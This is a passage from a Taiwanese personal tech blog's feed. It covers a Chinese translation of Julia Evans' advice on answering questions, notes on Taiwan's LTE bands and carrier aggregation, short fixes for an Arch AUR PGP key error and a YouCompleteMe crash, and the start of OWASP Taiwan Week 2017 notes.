&lt;li&gt;小華：「蛤？你竟然沒有聽過 Linux kernel？真的假的啊？」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;小華的反應（姑且先不論他到底是真的訝異還是假的訝異）一點幫助也沒有，&lt;br /&gt;
只會讓小明因為自己不知道 Linux kernel 是什麼而感到非常受傷。  &lt;/p&gt;
&lt;p&gt;即便我因為聽到對方不知道某個東西而真的感到有點訝異，&lt;br /&gt;
我反而會故作鎮定，能做到這點的話會是件很棒的事。  &lt;/p&gt;
&lt;h3&gt;能夠有效得回答問題是件非常棒的事&lt;/h3&gt;
&lt;p&gt;顯然的，以上這些方法並不是任何情況都適用，&lt;br /&gt;
但希望你至少可以從中找到幾個你覺得有用的方法。&lt;br /&gt;
我發現花時間回答問題與教導別人是非常有收穫的一件事。  &lt;/p&gt;
&lt;p&gt;非常感謝 Josh Triplett 為這篇文章給出許多建議和幫忙新增很多很棒的內容。&lt;br /&gt;
感謝 Harold Treen、Vaibhav Sagar、Peter Bhat Harkins、Wesley Aptekar-Cassels 和 Paul Gowder 花時間閱讀這篇文章並給予評論。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;更多譯註&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;這篇是目前在 Stripe 工作的 &lt;a href="https://jvns.ca/about/"&gt;Julia Evans&lt;/a&gt;，於今年 9 月 21 日發表在其部落格上的文章：&lt;a href="https://jvns.ca/blog/answer-questions-well/"&gt;How to answer questions in a helpful way - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Julia Evans 是我去年開始在 Feedly 上追蹤的一名美國女性程式設計師  &lt;/li&gt;
&lt;li&gt;忘記當初是因為哪篇文章追蹤的了，但我很佩服她的一點是，她學新東西的時候都會寫文章紀錄下來，並把東西講得非常詳細。雖然篇幅會非常長，但我每次看她的文章都覺得講得很清楚。  &lt;/li&gt;
&lt;li&gt;她還有&lt;a href="https://jvns.ca/zines/"&gt;一系列把程式技術相關的名詞畫成簡單的漫畫來講解&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;內容包括：Linux, Kubernetes, ...等等。  &lt;/li&gt;
&lt;li&gt;有些小孩甚至會看這些漫畫學習這些新技術，我覺得很酷。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可能很多人都有看過 &lt;a href="http://www.catb.org/%7Eesr/faqs/smart-questions.html"&gt;Eric Steven Raymond 的 How To Ask Questions The Smart Way&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中文翻譯為《提問的智慧》  &lt;/li&gt;
&lt;li&gt;最常被人拿出來說的就是 RTFM (Read The Fucking Manual）  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way"&gt;這裡有繁體中文版，沒看過的人建議一定要看一下&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;這篇文章非常強調問問題的人應該做好完整的功課，並且在詢問問題上要做到哪些事情，不要讓人不想回答你或是浪費回答你的人的時間。  &lt;/li&gt;
&lt;li&gt;但其實在這篇文章最後面有一節的名稱叫作 &lt;a href="http://www.catb.org/~esr/faqs/smart-questions.html#idm46060473965552"&gt;How to Answer Questions in a Helpful Way （中譯為《回答的智慧》）&lt;/a&gt;，但篇幅不多。  &lt;ul&gt;
&lt;li&gt;沒記錯的話其實早一點的版本沒有，好像是後來才加入這章節的。  &lt;/li&gt;
&lt;li&gt;而 Julia Evans 的這篇文章可以算是大大補足了這個章節的內容，也讓問答的雙方是比較平等一點的。  &lt;/li&gt;
&lt;li&gt;畢竟有時候還是會遇到準備問題的人準備得很充實，但得到的解答卻是隨隨便便的敷衍的那種狀況。  &lt;/li&gt;
&lt;li&gt;我想一個良好的問答品質需要雙方共同努力是一定的，這樣才能更有效率得教學相長。  &lt;/li&gt;
&lt;li&gt;其實如果按照原文標題 "How to answer questions in a helpful way" 來翻譯的話，應該翻成《如何更有效得回答問題》或《如何更好得回答問題》。  &lt;/li&gt;
&lt;li&gt;但因為 ESR 那篇文章被翻為《提問的智慧》，且裡頭同名的章節被翻譯成《回答的智慧》，所以我覺得這篇直接翻成《回答的智慧》會讓這兩篇文章更有連結性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;看完這篇文章的當下後想了一下，&lt;br /&gt;
發現自己之前回答同事的問題算是都有做到這篇文章提到的事情，&lt;br /&gt;
但我還有多做一件事：「告知對方下次可以怎樣問會更好。」&lt;br /&gt;
這篇也很適合三不五時回來看看並反省自己是否有做到。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這篇是我的部落格第 1 篇翻譯文章，&lt;br /&gt;
也是第 300 篇發佈的文章。&lt;br /&gt;
如果覺得翻譯得不錯的話，&lt;br /&gt;
請不吝留言和幫我分享這篇文章，&lt;br /&gt;
如果覺得哪邊翻譯的不太好的話，&lt;br /&gt;
也麻煩留言跟我說，&lt;br /&gt;
有任何討論也都歡迎留言。  &lt;/p&gt;</summary><category term="Julia Evans"></category><category term="Programmer"></category><category term="Answer Questions"></category><category term="Collaboration"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>關於 4G 行動網路的一些筆記</title><link href="https://blog.m157q.tw/posts/2017/12/20/4g-mobile-network-tw/" rel="alternate"></link><published>2017-12-21T14:47:50+08:00</published><updated>2017-12-21T14:47:50+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-20:posts/2017/12/20/4g-mobile-network-tw/</id><summary type="html">&lt;p&gt;本文利用工人智慧技術同步發表於 &lt;a href="https://ithelp.ithome.com.tw/articles/10192595"&gt;[2018 iThome 鐵人賽] Day 1: 關於 4G 行動網路的一些筆記 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實手機使用中華電信的 4G 行動網路已經將近快兩年了，&lt;br /&gt;
但其實一直以來就只是用而已，對它並沒有很瞭解。&lt;br /&gt;
最近因為：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;中華電信在我目前的租屋處收訊不好，即便是使用了 4G 行動網路，速度還是很慢，更別說常常掉到 3G 行動網路。  &lt;/li&gt;
&lt;li&gt;一到人多的地方，中華電信的 4G 行動網路就卡死了，因為附近的使用者太多，導致頻寬過少，基地台負荷不了。  &lt;/li&gt;
&lt;li&gt;目前使用中華電信的 4G 行動上網吃到飽方案，一個月要將近 1400 元新台幣的費用，我覺得以這服務品質來說實在太過於不划算（當初是因為要當個孝子，讓媽免費拿平板才綁這兩年約。Orz）。算了一下，調降目前的資費再選擇其他電信商的 4G 吃到飽專案，隨便搭都比我現在的費用便宜。  &lt;/li&gt;
&lt;li&gt;iOS 開 Wi-Fi 熱點分享很雷(我是用 iPhone SE + iOS 10.3.1），有以下幾個我覺得很雷的點：  &lt;ul&gt;
&lt;li&gt;開熱點分享真的很耗電，常常都要接著充電，覺得很麻煩。  &lt;/li&gt;
&lt;li&gt;疑似是通訊晶片的問題，開熱點分享常常要開好幾次才找得到。  &lt;/li&gt;
&lt;li&gt;遇到附近有記憶過的無線網路也沒辦法開熱點分享，因為會直接連上該無線網路。在前公司遇到一些狀況要切換網路環境測試的時候很麻煩，還不如直接用 USB tethering。  &lt;/li&gt;
&lt;li&gt;開熱點分享的時候螢幕上永遠有一條藍色的 status bar 沒辦法關掉，iPhone SE 的螢幕就夠小了，更別說常常不小心點到，就跑到開關熱點的畫面，覺得很煩。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iOS App Store 如果安裝或更新需要下載超過 150 MB 的話，就一定要你連上 Wi-Fi，真的不知道這到底是什麼鳥設計。  &lt;ul&gt;
&lt;li&gt;更新 iOS 版本也要連上 Wi-Fi，所以我幾乎沒更新過，還好最近 iOS 11 看來寫的不太好，可能也不需要急著更新。  &lt;/li&gt;
&lt;li&gt;當然是不能連自己的熱點分享，加上身為一個邊緣阿宅又不太敢連 Public Wi-Fi 的人，常常有些 App 不能更新或安裝，所以必須要有一個額外的 Wi-Fi 來源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;租屋處有使用 Chromecast 2 的需求，它如果連到手機分享出來的 Wi-Fi 熱點的話，分享熱點的手機就不能控制它。  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因為以上種種原因，&lt;br /&gt;
加上所以打算多買一張 4G SIM 卡搭配 4G 行動網路分享器，&lt;br /&gt;
在看分享器商品規格的時候發現自己都看不太懂，&lt;br /&gt;
所以花了不少時間查 4G 行動網路相關的資料，&lt;br /&gt;
才發現有些裝置對台灣的電信商支援程度不一，&lt;br /&gt;
買錯的話很可能買來卻不能用，&lt;br /&gt;
或者只能發揮一半的效能，&lt;br /&gt;
想說就在這篇文章筆記一下。  &lt;/p&gt;
&lt;p&gt;（至於 4G 行動網路分享器的部份之後應該也會有一篇某牌設備的使用心得，但不會在這篇提及。因為目前使用上出了些問題，跟原廠回報問題後目前正在處理中。）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;名詞定義&lt;/h2&gt;
&lt;p&gt;首先來搞懂基本的名詞  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4G, LTE, WiMAX  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/4G"&gt;第四代行動通訊技術（英語：The fourth generation of mobile phone mobile communication technology standards，縮寫為 4G）&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2008 年 3 月，在國際電信聯盟 - 無線電通訊部門（ITU-R）指定一組用於 4G 標準的要求，命名為 IMT-Advanced 規範，設定 4G 服務的峰值速度要求在高速行動的通訊（如在火車和汽車上使用）達到 100 Mbit/s，固定或低速行動的通訊（如行人和定點上網的用戶）達到 1 Gbit/s。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;簡單來說，可以想成 4G 只是對於網路速度最大值的門檻，如果行動網路速度的最大值有辦法達到上述條件，則可稱做 4G。（是最大值，不是最小值。）  &lt;/li&gt;
&lt;li&gt;這門檻其實滿高的，不信的話可以拿手機出來測一下網路速度看差多少。  &lt;/li&gt;
&lt;li&gt;最早出現「號稱 4G」的兩個通訊標準：  &lt;ul&gt;
&lt;li&gt;一個是我們現在在台灣最常看到的 &lt;a href="https://zh.wikipedia.org/zh-tw/%E9%95%B7%E6%9C%9F%E6%BC%94%E9%80%B2%E6%8A%80%E8%A1%93"&gt;LTE&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;另外一個則是&lt;a href="https://zh.wikipedia.org/zh-tw/WiMAX#WiMAX%E5%85%A8%E9%9D%A2%E6%92%A4%E5%8F%B0"&gt;在台灣做不起來的 WiMAX&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;至於為什麼做不起來，詳情可以參考這篇文章：&lt;a href="https://hellolynn.hpd.io/2017/05/19/%E4%BD%A0%E6%9C%89%E8%81%BD%E9%81%8E%E5%8F%B0%E7%81%A3%E7%B4%8D%E7%A8%85%E4%BA%BA%E7%9A%84%E8%A1%80%E6%B7%9Awimax%E5%97%8E-4g%E7%AF%87/"&gt;你有聽過台灣納稅人的血淚WiMax嗎？中離王Intel與榮景不再的高通—4G 篇 – 寫點科普，請給指教。&lt;/a&gt; （私心推薦一下這個 Blog，內容大部份都滿完整且簡單易懂的，而且作者不是資通訊本科生還是一個人因為興趣而寫這些文章，真的覺得很厲害。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但其實這兩種通訊標準根本達不到 4G 的門檻  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2010 年 12 月 6 日，ITU-R 的承認，這兩種技術，以及其他 3.9 技術，不符合 IMT-Advanced 的要求，仍可以被認為是「4G」，但前提是它們是先行者，以 IMT-Advanced 的標準版本和改善的效能和功能來看它只是相當於現在部署的 3G 網路的程度。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;真正符合 IMT-Advanced 的 4G 規範的其實是 &lt;a href="https://zh.wikipedia.org/zh-tw/4G#IMT-Advanced%E7%9A%844G%E6%A8%99%E6%BA%96"&gt;LTE-Advanced (LTE-A) 和 WirelessMAN-Advanced (又稱 WiMAX-Advanced 或 WiMAX 2)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上現在 4G 行動網路發展都以 LTE 為主流了，LTE-Advanced 因為可以透過軟體將 LTE 升級達到，現在台灣的電信商基本上都有支援了，不過能不能使用 LTE-Advanced 的載波聚合來達到真正的 4G 標準速度，就得看裝置了。（至於什麼是載波聚合？下面會提到。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;詳細一點可以參考：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.eprice.com.tw/mobile/talk/5035/4979930/1/"&gt;看的好亂啊？！帶你秒懂電信 4G 名詞，不再眼花花 - 手機新聞 | ePrice 比價王&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kocpc.com.tw/archives/68833"&gt;【電信服務】什麼是「真4G」 - 電腦王阿達&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;正片開始&lt;/h2&gt;
&lt;h3&gt;已經用 4G SIM 卡了嗎？你的網路速度很有可能可以再更快。&lt;/h3&gt;
&lt;p&gt;撇開收訊問題，&lt;br /&gt;
你知道同一張 SIM 卡使用都支援 4G 行動網路的不同裝置，&lt;br /&gt;
速度可能會差很多嗎？  &lt;/p&gt;
&lt;p&gt;這跟上面提到的載波聚合（Carrier Aggregation，簡稱 CA）技術有關，&lt;br /&gt;
簡單來說就是透過同時使用不同的 LTE 頻段來增加網路頻寬，&lt;br /&gt;
基本上台灣的電信商目前都至少擁有 3 個以上的 LTE 頻段（中華電信和遠傳有 4 個頻段）。&lt;br /&gt;
可以參考這張 Wikipedia 的截圖（頻段未來有可能會再變動，請以較新的資料為準。）  &lt;/p&gt;
&lt;p&gt;&lt;img alt="20171220-4g-lte-tw" src="/files/4g-mobile-network-tw/20171220-4g-lte-tw.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;2CA 就是支援兩個頻段（也有可能是同一個頻段，但兩個不連續的區塊組合），&lt;br /&gt;
3CA 則依此類推。&lt;br /&gt;
有沒有支援載波聚合必須看各個裝置，&lt;br /&gt;
如果使用的裝置沒支援的話同一時間只會使用一個頻段，&lt;br /&gt;
當頻寬被附近其他使用同個基地台的使用者佔滿的話，&lt;br /&gt;
網路速度就上不去。&lt;br /&gt;
但如果使用的裝置有支援載波聚合的話，&lt;br /&gt;
就會自動選擇頻寬較足夠的頻段。&lt;br /&gt;
所以購買使用 4G 行動網路的裝置之前，&lt;br /&gt;
除了確認該裝置有支援你要使用的電信商的頻段以外，&lt;br /&gt;
如果想要網路速度能夠快一點的話，&lt;br /&gt;
最好就選擇支援愈多頻段載波聚合的裝置，&lt;br /&gt;
當然價格也會比較貴一些。  &lt;/p&gt;
&lt;p&gt;詳細可以參考以下幾篇文章：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://axiang.cc/archives/22019"&gt;4G該怎麼選？4G+和CA又是什麼？告訴你七個辦4G前必看的問題！ | 阿祥的網路筆記本&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pigapril.pixnet.net/blog/post/319935925-%E3%80%903c%E3%80%91%E7%B0%A1%E5%96%AE%E6%98%93%E6%87%82---%E4%BB%80%E9%BA%BC%E6%98%AF%22%E8%BC%89%E6%B3%A2%E8%81%9A%E5%90%88carrier-aggrega"&gt;【3C】簡單易懂 - 什麼是"載波聚合Carrier Aggregation", 到底有哪些手機支援!? @ 火星豬 :: 痞客邦 PIXNET ::&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://tel3c.tw/blog/post/222391175"&gt;為何明明買了支援CA手機卻飆不了速呢? 2CA/3CA/4CA支援頻段揭密 - 小丰子3C俱樂部&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;到底頻段是要看 MHz 還是看 Band？&lt;/h3&gt;
&lt;p&gt;在購買 LTE 相關裝置的時候，&lt;br /&gt;
常常會在商品介紹或規格中看到頻段是用 700 MHz, 900 MHz, 1800 MHz, 2100 MHz, 2600 MHz&lt;br /&gt;
或 B28, B8, B3, B1, B7, B38 來表示，&lt;br /&gt;
這邊提供兩張目前台灣電信商使用的頻段對照表，一個照 MHz 由小到大排序，一個照 Band 由小到大排序。  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;MHz&lt;/th&gt;
&lt;th&gt;Band&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;700&lt;/td&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;900&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1800&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2100&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2600&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2600&lt;/td&gt;
&lt;td&gt;38&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Band&lt;/th&gt;
&lt;th&gt;MHz&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2100 (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1800 (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;2600 (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;900  (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;td&gt;700  (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;38&lt;/td&gt;
&lt;td&gt;2600 (TD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;眼尖的人可能會發現有 2 個 2600 MHz，&lt;br /&gt;
所以比較常看到都會用 B1, B3, B7, B8, B28, B38 來表示，&lt;br /&gt;
因為比較不會混淆。&lt;br /&gt;
至於如果是用 MHz 來表示的話，&lt;br /&gt;
可能就要注意一下 2600 MHz 的部份是否只有支援 FDD-LTE, TD-LTE 或兩者都有支援。&lt;br /&gt;
如果有到其他國家使用的需求的話，&lt;br /&gt;
則需要確認一下該國電信商使用的頻段。  &lt;/p&gt;
&lt;h3&gt;支援台灣全頻段？&lt;/h3&gt;
&lt;p&gt;常常會看到有些產品號稱支援台灣 LTE 全頻段，&lt;br /&gt;
到底是什麼意思？&lt;br /&gt;
以目前來說，&lt;br /&gt;
如果要「完整」支援台灣全頻段的話，&lt;br /&gt;
就是要支援上述所有提到的 B1, B3, B7, B8, B28, B38。&lt;br /&gt;
或 700, 900, 1800, 2100, 2600 (FDD-LTE), 2600 (TD-LTE)。&lt;br /&gt;
如果未來有新的頻段的話則會再更多。  &lt;/p&gt;
&lt;p&gt;為什麼說「完整」呢？&lt;br /&gt;
因為有些標榜支援台灣全頻段的產品，&lt;br /&gt;
其實只有支援 B1, B3, B7, B8，&lt;br /&gt;
這點在購買上要注意一下。  &lt;/p&gt;
&lt;h3&gt;不同的頻段有什麼差別嗎？&lt;/h3&gt;
&lt;p&gt;頻率不同，波長不同，涵蓋範圍不同，基地台所需數目不同，單一基地台服務使用者數目不同，網路塞車可能性不同。&lt;br /&gt;
可以用以下的對照表來呈現，以頻率最高的 700 MHz 和 2600 MHz 來比較。  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;頻率&lt;/th&gt;
&lt;th&gt;波長&lt;/th&gt;
&lt;th&gt;涵蓋範圍&lt;/th&gt;
&lt;th&gt;基地台所需數目&lt;/th&gt;
&lt;th&gt;單一基地台服務使用者數&lt;/th&gt;
&lt;th&gt;網路塞車可能性&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;700 MHz&lt;/td&gt;
&lt;td&gt;較長&lt;/td&gt;
&lt;td&gt;較大&lt;/td&gt;
&lt;td&gt;較少&lt;/td&gt;
&lt;td&gt;較多&lt;/td&gt;
&lt;td&gt;較高&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2600 MHz&lt;/td&gt;
&lt;td&gt;較短&lt;/td&gt;
&lt;td&gt;較小&lt;/td&gt;
&lt;td&gt;較多&lt;/td&gt;
&lt;td&gt;較少&lt;/td&gt;
&lt;td&gt;較低&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;實際使用上會跟訊號強度以及電信商佈署的基地台密度有關。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;OpenSignalMap 這個 App 挺好用的，不僅可以查使用中的 SIM 卡電信商的基地台位置，也可以測行動網路和使用的 Wi-Fi 網路的速度。  &lt;/li&gt;
&lt;li&gt;VoLTE, FDD-LTE, TDD-LTE 這些有空會再補充，今天有點來不及寫完啦。(也可能不會補充？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因為沒有很懂，&lt;br /&gt;
所以可能會有錯誤的地方，&lt;br /&gt;
歡迎留言回覆告知討論交流，&lt;br /&gt;
感謝。  &lt;/p&gt;</summary><category term="4G"></category><category term="LTE"></category><category term="2018 iT 邦幫忙鐵人賽"></category><category term="Mobile Network"></category></entry><entry><title>ERROR: One or more PGP signatures could not be verified</title><link href="https://blog.m157q.tw/posts/2017/11/27/one-or-more-pgp-signatures-could-not-be-verified/" rel="alternate"></link><published>2017-11-27T14:56:38+08:00</published><updated>2017-11-27T14:56:38+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-27:posts/2017/11/27/one-or-more-pgp-signatures-could-not-be-verified/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gpg --keyserver keys.gnupg.net --recv-keys ${PGP_PUBLIC_KEY}&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;Encountered this error while installing &lt;code&gt;firefox-nightly&lt;/code&gt; from AUR  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;==&amp;gt; Verifying source file signatures with gpg...  
    20171127-firefox-59.0a1.en-US.linux-x86_64.tar.bz2 ... FAILED (unknown public key BBBEBDBB24C6F355)  
==&amp;gt; ERROR: One or more PGP signatures could not be verified!  
==&amp;gt; ERROR: Makepkg was unable to build firefox-nightly.  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gpg --keyserver keys.gnupg.net --recv-keys BBBEBDBB24C6F355&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=191954"&gt;One or more PGP signatures could not be verified! / AUR Issues, Discussion &amp;amp; PKGBUILD Requests / Arch Linux Forums&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://allanmcrae.com/2015/01/two-pgp-keyrings-for-package-management-in-arch-linux/"&gt;Two PGP Keyrings for Package Management in Arch Linux | Allan McRae&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="makepkg"></category><category term="yaourt"></category><category term="AUR"></category><category term="PGP"></category></entry><entry><title>The ycmd server SHUT DOWN (restart with ':YcmRestartServer')</title><link href="https://blog.m157q.tw/posts/2017/11/27/youcompleteme-ycmd-server-shut-down-restart-with-ycmrestartserver/" rel="alternate"></link><published>2017-11-27T12:47:33+08:00</published><updated>2017-11-27T12:47:33+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-27:posts/2017/11/27/youcompleteme-ycmd-server-shut-down-restart-with-ycmrestartserver/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711"&gt;https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/.vim/bundle/YouCompleteMe  
./install.py --clang-completer  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;YouCompleteMe doesn't work anymore in my Vim.  &lt;/li&gt;
&lt;li&gt;Got &lt;code&gt;The ycmd server SHUT DOWN (restart with ':YcmRestartServer')&lt;/code&gt; in status bar everytime Vim starts.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;:YcmRestartServer&lt;/code&gt; always failed.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;:YcmDebugInfo&lt;/code&gt; shows the system path of YouCompleteMe stderr log.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ less /tmp/ycmd_52159_stderr_m7n92px1.log&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;It shows &lt;code&gt;ModuleNotFoundError: No module named 'ycm_core'&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/.vim/bundle/YouCompleteMe  
./install.py --clang-completer  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Reinstall YouCompleteMe with Clang completer works.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe/issues/914"&gt;https://github.com/Valloric/YouCompleteMe/issues/914&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711"&gt;https://github.com/Valloric/YouCompleteMe/issues/1707#issuecomment-222056711&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Vim"></category><category term="YouCompleteMe"></category></entry><entry><title>OWASP Taiwan Week 2017</title><link href="https://blog.m157q.tw/posts/2017/11/20/owasp-taiwan-week-2017/" rel="alternate"></link><published>2017-11-20T18:01:33+08:00</published><updated>2017-11-20T18:01:33+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-20:posts/2017/11/20/owasp-taiwan-week-2017/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;event links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://csa.kktix.cc/events/owasp2017"&gt;https://csa.kktix.cc/events/owasp2017&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://2017.owasp.org.tw/agenda_2.html"&gt;http://2017.owasp.org.tw/agenda_2.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="/files/owasp-taiwan-week-2017/OWASP Top 10 2017 GM (en).pdf"&gt;OWASP 2017 Top 10 Golden Master (EN) 備份&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;開場&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Top_10_2017-Top_10"&gt;OWASP 2017 Top 10&lt;/a&gt; 已經釋出，上一次正式發佈是 2013 年。  &lt;ul&gt;
&lt;li&gt;2017 分別有 RC1 和 RC2，中間有些差異，大家吵了很久。XD  &lt;/li&gt;
&lt;li&gt;原來 &lt;a href="https://github.com/OWASP/Top10"&gt;OWASP Top 10 有 GitHub Repo&lt;/a&gt; 啊。  &lt;/li&gt;
